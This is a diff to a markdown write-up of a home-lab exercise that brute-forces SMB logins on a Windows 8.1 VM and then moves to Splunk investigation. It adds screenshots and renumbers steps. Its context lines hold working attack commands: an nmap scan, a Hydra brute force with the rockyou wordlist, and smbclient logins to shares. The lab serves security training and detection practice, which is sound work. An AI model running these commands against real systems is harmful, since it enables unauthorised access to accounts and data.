@@ -29,6 +29,7 @@ This lab simulates a brute-force attack on a Windows 8.1 VM using the SMB protoc
 ```bash
 nmap -sV -O -p- 192.168.29.236
 ```
+![Description for image 1](../Screenshots/BF-img1.png) 
 
 ### 2. SMB Brute Force via Hydra (Kali)
 ```bash
@@ -38,13 +39,20 @@ or
 ```bash
 hydra -l Futwear -P /usr/share/wordlists/rockyou.txt smb://192.168.29.236 
 ```
+![Description for image 1](../Screenshots/BF-img2.png) 
 
-### 2. Login to smb with valid credentials (Kali)
+### 3. Login to smb with valid credentials (Kali)
 **checks available shares**
 ```bash
 smbclient -L //192.168.29.236 -U Futwear
 ```
+
+![Description for image 1](../Screenshots/BF-img3.png) 
+
 **To access and login to the smb shares**
 ```bash
 smbclient -U Futwear //192.168.29.236/IPC$ -m SMB2
 ```
+![Description for image 1](../Screenshots/BF-img4.png) 
+
+### 4. Investigate in Splunk
